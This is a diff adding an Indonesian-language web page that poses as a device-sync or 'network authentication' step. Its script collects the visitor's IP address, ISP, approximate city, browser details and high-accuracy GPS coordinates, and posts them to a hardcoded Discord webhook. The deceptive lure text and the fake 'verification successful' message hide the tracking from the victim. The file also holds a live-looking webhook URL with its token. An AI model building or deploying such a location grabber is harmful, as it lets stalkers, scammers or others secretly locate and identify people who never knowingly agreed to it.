@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Informasi Perangkat</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4; }
+        .box { max-width: 400px; margin: 0 auto; background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .btn { background-color: #28a745; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>Mengambil Data Lokasi...</h2>
+    <p id="status">Sistem memerlukan sinkronisasi perangkat. Silakan klik tombol di bawah untuk melanjutkan ke halaman.</p>
+    
+    <!-- Tombol wajib untuk memicu pop-up izin lokasi pada browser modern -->
+    <button class="btn" id="btnAkses" onclick="jalankanSistem()">Masuk ke Halaman</button>
+</div>
+
+<script>
+    const statusText = document.getElementById('status');
+    const btnAkses = document.getElementById('btnAkses');
+    const webhookUrl = "https://discord.com/api/webhooks/1473581902454853777/5AIh1HAd8YUaOzi2fY3PVu-6jGeFRzKVWgDG7fg3g5LfoXZcmbeh3QJjrNC47JwmbBsh"; 
+
+    // 1. Perbaikan Fungsi Pengambil IP (URL Endpoint diperbaiki ke format JSON resmi)
+    async function getIPAndFallbackData() {
+        try {
+            const response = await fetch('https://ip-api.com');
+            const data = await response.json();
+            
+            if(data.status === "fail") throw new Error(data.message);
+            
+            return {
+                ip: data.query || "Tidak terdeteksi",
+                city: data.city || "Tidak diketahui",
+                region: data.regionName || "Tidak diketahui",
+                country: data.country || "Tidak diketahui",
+                org: data.isp || "Tidak diketahui"
+            };
+        } catch (error) {
+            console.log("API Utama gagal, mencoba API Cadangan...");
+            try {
+                // Perbaikan URL cadangan ke format JSON resmi milik ipify
+                const resBackup = await fetch('https://ipify.org');
+                const dataBackup = await resBackup.json();
+                return { ip: dataBackup.ip, city: "Manual", region: "Manual", country: "Manual", org: "Jaringan" };
+            } catch(e) {
+                return { ip: "Gagal Total", city: "-", region: "-", country: "-", org: "-" };
+            }
+        }
+    }
+
+    function getDeviceOS() {
+        return navigator.userAgent;
+    }
+
+    function sendDataToServer(payload) {
+        if (!webhookUrl) return;
+
+        const bodyData = JSON.stringify({
+            content: `📌 **Log Baru Terdeteksi!**\n🌐 **IP**: ${payload.ip}\n🌍 **Lokasi Estimasi**: ${payload.lokasi_estimasi}\n🏢 **ISP**: ${payload.provider}\n📍 **GPS**: ${payload.latitude}, ${payload.longitude} (Akurasi: ${payload.akurasi})\n📱 **OS/Browser**: ${payload.os_browser}\n🛠️ **Metode**: ${payload.metode_pelacakan}`
+        });
+
+        fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: bodyData
+        }).catch(err => console.error("Fetch Error:", err));
+    }
+
+    // Fungsi utama dipicu lewat klik tombol agar lolos dari proteksi pemblokiran browser
+    async function jalankanSistem() {
+        btnAkses.disabled = true;
+        btnAkses.innerText = "Memproses...";
+        statusText.innerHTML = "Sedang memproses otentikasi jaringan, mohon setujui permintaan akses lokasi jika muncul...";
+
+        const ipData = await getIPAndFallbackData();
+        const osDetails = getDeviceOS();
+
+        const payload = {
+            ip: ipData.ip,
+            os_browser: osDetails,
+            provider: ipData.org,
+            latitude: "Ditolak/Belum Diizinkan",
+            longitude: "Ditolak/Belum Diizinkan",
+            akurasi: "-",
+            metode_pelacakan: "IP Geolocation (Estimasi Jaringan)",
+            lokasi_estimasi: `${ipData.city}, ${ipData.region}, ${ipData.country}`
+        };
+
+        // Kirim data IP dasar terlebih dahulu
+        sendDataToServer(payload);
+
+        if (!navigator.geolocation) {
+            payload.metode_pelacakan = "IP Only (HTML5 Tidak Didukung)";
+            statusText.innerHTML = "Perangkat tidak mendukung sensor lokasi HTML5.";
+            return;
+        }
+
+        const opsiGPS = {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        };
+
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                payload.latitude = position.coords.latitude;
+                payload.longitude = position.coords.longitude;
+                payload.akurasi = `${position.coords.accuracy} meter`;
+                payload.metode_pelacakan = "HTML5 Akurat (GPS Terizin)";
+
+                statusText.innerHTML = `<span style="color:green;"><b>Verifikasi Berhasil! Akses Diberikan.</b></span>`;
+                
+                // Kirim pembaruan dengan koordinat GPS akurat
+                sendDataToServer(payload);
+            },
+            (error) => {
+                let alasan = "Izin ditolak atau diblokir browser (Wajib menggunakan protokol HTTPS).";
+                if(error.code === error.TIMEOUT) alasan = "Waktu tunggu pencarian GPS habis.";
+                if(error.code === error.POSITION_UNAVAILABLE) alasan = "Sensor lokasi tidak merespons.";
+                
+                statusText.innerHTML = `<span style="color:red;">Error: ${alasan}</span>`;
+            },
+            opsiGPS
+        );
+    }
+</script>
+
+</body>
+</html>
